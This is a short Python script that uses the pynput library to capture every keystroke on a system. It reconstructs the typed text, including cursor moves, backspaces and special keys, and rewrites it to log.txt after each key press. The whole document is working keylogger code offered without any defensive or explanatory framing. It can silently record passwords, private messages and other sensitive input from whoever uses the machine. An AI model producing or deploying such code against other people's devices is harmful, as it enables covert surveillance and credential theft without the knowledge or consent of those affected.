from pynput.keyboard import Listener, Key

# Buffer that contains the current text
content = []
# Cursor position in the buffer
cursor_pos = 0

def on_press(key):
    global content, cursor_pos

    try:
        # If the key is a standard character (letter, number, etc.)
        if hasattr(key, 'char') and key.char is not None:
            content.insert(cursor_pos, key.char)
            cursor_pos += 1

        elif key == Key.left:
            if cursor_pos > 0:
                cursor_pos -= 1

        elif key == Key.right:
            if cursor_pos < len(content):
                cursor_pos += 1

        elif key == Key.backspace:
            if cursor_pos > 0:
                content.pop(cursor_pos - 1)
                cursor_pos -= 1

        elif key == Key.enter:
            content.insert(cursor_pos, '\n')
            cursor_pos += 1

        elif key == Key.space:
            content.insert(cursor_pos, ' ')
            cursor_pos += 1

        else:
            # For any other special key (eg: shift, ctrl...)
            rep = f"[{key.name if hasattr(key, 'name') else key}]"
            for c in rep:
                content.insert(cursor_pos, c)
                cursor_pos += 1

        # Write buffer to file on each keystroke
        with open("log.txt", "w", encoding="utf-8") as f:
            f.write("".join(content))

    except Exception as e:
        print("Erreur :", e)

# Start listening to keystrokes
with Listener(on_press=on_press) as listener:
    listener.join()


